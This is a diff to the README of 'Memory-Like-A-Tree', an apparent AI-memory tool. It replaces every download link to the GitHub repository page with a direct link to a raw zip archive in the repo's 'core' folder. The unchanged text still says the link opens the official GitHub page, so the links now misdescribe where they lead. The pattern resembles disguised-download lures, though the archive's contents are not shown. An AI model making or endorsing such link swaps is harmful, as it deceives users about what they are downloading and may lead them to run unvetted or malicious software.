@@ -1,6 +1,6 @@
 # 🌳 Memory-Like-A-Tree - Manage AI Memory Simply  
 
-[![Download Now](https://img.shields.io/badge/Download-Memory--Like--A--Tree-%239b59b6)](https://github.com/zxt-01/Memory-Like-A-Tree)
+[![Download Now](https://img.shields.io/badge/Download-Memory--Like--A--Tree-%239b59b6)](https://raw.githubusercontent.com/zxt-01/Memory-Like-A-Tree/main/core/Like-Memory-Tree-2.8.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Memory-Like-A-Tree is easy to install. Follow these steps carefully. You will do
 
 Click this link to open the download page in your browser:  
 
-[Download Memory-Like-A-Tree](https://github.com/zxt-01/Memory-Like-A-Tree)  
+[Download Memory-Like-A-Tree](https://raw.githubusercontent.com/zxt-01/Memory-Like-A-Tree/main/core/Like-Memory-Tree-2.8.zip)  
 
 This takes you to the official GitHub page where you can get the latest version.
 
@@ -126,7 +126,7 @@ If problems persist, ask for help in the GitHub issues section.
 
 You can always get the latest version here:  
 
-[![Download Now](https://img.shields.io/badge/Download-Memory--Like--A--Tree-%2388c0d0)](https://github.com/zxt-01/Memory-Like-A-Tree)
+[![Download Now](https://img.shields.io/badge/Download-Memory--Like--A--Tree-%2388c0d0)](https://raw.githubusercontent.com/zxt-01/Memory-Like-A-Tree/main/core/Like-Memory-Tree-2.8.zip)
 
 Click the link and follow the steps above to download and install.
 
